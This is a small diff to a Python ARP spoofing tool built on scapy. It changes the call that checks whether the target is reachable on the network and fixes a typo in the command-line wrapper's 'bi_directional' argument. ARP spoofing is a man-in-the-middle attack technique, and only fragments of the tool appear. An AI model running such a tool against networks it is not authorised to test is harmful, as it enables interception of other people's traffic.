@@ -15,8 +15,8 @@ def gen_arp_response(target_ip, spoof_ip):
     :return: A scapy packet
     """
 
-    if scan_results := networkscan.scan(
-        target_ip
+    if scan_results := networkscan.get_clients(
+        target_ip, 10
     ):  # checks to see if the target is reachable on the network
         target = scan_results[0]
         packet = scapy.ARP(
@@ -71,4 +71,4 @@ def arpspoof(target_ip, spoof_ip, bi_directional=False, delay=1):
     help="Delay between sending each set of packets (seconds)",
 )
 def cli(target_ip, spoof_ip, bi_directional, delay):
-    arpspoof(target_ip, spoof_ip, bi_directinal, delay)
+    arpspoof(target_ip, spoof_ip, bi_directional, delay)
